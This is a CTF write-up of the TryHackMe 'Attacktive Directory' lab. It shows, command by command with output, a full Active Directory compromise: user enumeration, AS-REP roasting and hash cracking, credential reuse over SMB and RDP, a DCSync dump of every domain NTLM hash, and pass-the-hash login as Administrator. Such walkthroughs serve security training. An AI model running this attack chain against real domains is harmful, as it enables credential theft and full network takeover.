---
title: "Attacktive Directory"
date: 2026-06-27 09:00:00 +0800
categories: [CTF Write-ups, TryHackMe]
tags: [tryhackme, active-directory, medium, kerberos, windows]
description: "TryHackMe Attacktive Directory write-up — enumerating and exploiting a vulnerable domain controller."
image:
  path: /assets/img/posts/thm/Attacktive_Directory/Attacktive_Directory.png
  alt: "Attacktive Directory"
---

### LAB info
**Link : [Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)**

**Description : 99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?**

**Difficulty : Medium**


### nmap scan

```bash
nmap -sCV -Pn 10.48.155.86 -p- 
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-24 21:30:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2026-06-23T21:24:50
|_Not valid after:  2026-12-23T21:24:50
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-24T21:31:20+00:00
|_ssl-date: 2026-06-24T21:31:27+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-06-24T21:31:19
|_  start_date: N/A

```

### smb enumeration 

```bash
enum4linux -a 10.48.155.86 
```

### kerberute to brute force 

```bash
./kerbrute_linux_amd64 userenum -d spookysec.local --dc spookysec.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt -v
```

thr is a few username found 

```
james@spookysec.local
svc-admin@spookysec.local
James@spookysec.local
robin@spookysec.local
arkstar@spookysec.local
administrator@spookysec.local
ackup@spookysec.local
paradox@spookysec.local
AMES@spookysec.local
Robin@spookysec.local
Administrator@spookysec.local
Darkstar@spookysec.local
Paradox@spookysec.local
DARKSTAR@spookysec.local
ori@spookysec.local
ROBIN@spookysec.local
```

### AS-REP roasting attack

```bash
impacket-GetNPUsers spookysec.local/ -dc-ip 10.48.155.86 -no-pass -usersfile user.txt 
```

```output
[-] User james@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:08564ce97d547d691aaea62147e1b495$a0c46699e2c4715f2cc4ec1f71b24df9242cc349952198262af89d3172159e7b5ae3b0c1bb093782bbe780a76d6b9d8b49d1b111724d532a51d9f7da46ebcefb70b6765a3738a2080034b393f2547dc441254c0578220b80da2d3c53b8e12e8825335e11fb7d17ba27503b379f21dc4eb5eae83487c18ac22a9f0bf071218ee3b5fdaa76cfbafd529dbcc44f51aca12d4a8802d7536828bdea577d3a8923ef180d2656d598545294eae6d1bc2365d8b8d8cfc08fa740ea90935f95ddb866cdf2cd7301ddd3d88cf7d61a2a21d94af89e7447da62860f4da82e30ee619490a8cb412b1663082b253c9393fbbde312bee478fe
[-] User James@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User paradox@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darkstar@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Paradox@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARKSTAR@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROBIN@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### crack with hashcat 

```cmd
hashcat.exe -m 18200 ..\hash.txt ..\rockyou.txt
```

```username and password
svc-admin
management2005
```

### Enumeration with user svc-admin

```bash
netexec smb spookysec.local -u svc-admin -p management2005 --shares
```

![Image1](/assets/img/posts/thm/Attacktive_Directory/Attacktive_Directory-1.png)

```bash
netexec smb spookysec.local -u svc-admin -p management2005 --users 
```

![Image1](/assets/img/posts/thm/Attacktive_Directory/Attacktive_Directory-2.png)

```bash
netexec rdp spookysec.local -u svc-admin -p management2005
```

![Image1](/assets/img/posts/thm/Attacktive_Directory/Attacktive_Directory-3.png)

### Rdp and get user txt

```bash
xfreerdp3 /u:svc-admin /p:management2005 /v:10.48.155.86 /d:spookysec.local /dynamic-resolution +clipboard
```

once login we will get the first user txt

![Image1](/assets/img/posts/thm/Attacktive_Directory/Attacktive_Directory-4.png)

### found cred txt via smb shares

now let us back to smb thr is back up folder that we have access

![Image1](/assets/img/posts/thm/Attacktive_Directory/Attacktive_Directory-5.png)

we found a cred txt file

![Image1](/assets/img/posts/thm/Attacktive_Directory/Attacktive_Directory-6.png)


```
backup@spookysec.local:backup2517860
```


### enumeration with user backup amd get other user txt

then we can rdp  and get the other user.txt

![Image1](/assets/img/posts/thm/Attacktive_Directory/Attacktive_Directory-7.png)


### bloodhound

```bash
bloodhound-ce-python -u 'backup' -p 'backup2517860' -d spookysec.local -dc ATTACKTIVEDIREC.spookysec.local -ns 10.48.155.86 -c All
```

### DCsync attack

when i look for the Dcsync privilege i found that the user backup have genericALL on the domain

![Image1](/assets/img/posts/thm/Attacktive_Directory/Attacktive_Directory-8.png)

so we can DCsync attack using impacket-secretdumps

```bash
impacket-secretsdump spookysec.local/backup:'backup2517860'@10.49.134.106 -dc-ip 10.49.134.106 -just-dc
```

```output
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:97242df469667d0de774cf10f8a5450b:::
```

![Image1](/assets/img/posts/thm/Attacktive_Directory/Attacktive_Directory-9.png)

### Get root txt

we can just use winrm 

```bash
evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

![Image1](/assets/img/posts/thm/Attacktive_Directory/Attacktive_Directory-10.png)
